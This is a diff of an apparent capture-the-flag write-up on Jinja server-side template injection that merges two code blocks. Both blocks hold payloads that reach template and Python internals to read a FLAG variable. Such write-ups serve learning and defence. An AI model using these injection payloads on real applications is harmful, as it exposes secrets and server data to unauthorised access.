@@ -87,11 +87,8 @@ Now running in **unsandboxed Jinja environment**.
 ### Payloads
 
 ```html
-{{ self.__init__.__globals__['FLAG'] }}
-```
-
-```html
-{{ self.__dict__._TemplateReference__context.get('FLAG') }}
+{{ self.__init__.__globals__['FLAG'] }} {{
+self.__dict__._TemplateReference__context.get('FLAG') }}
 ```
 
 ## Flag
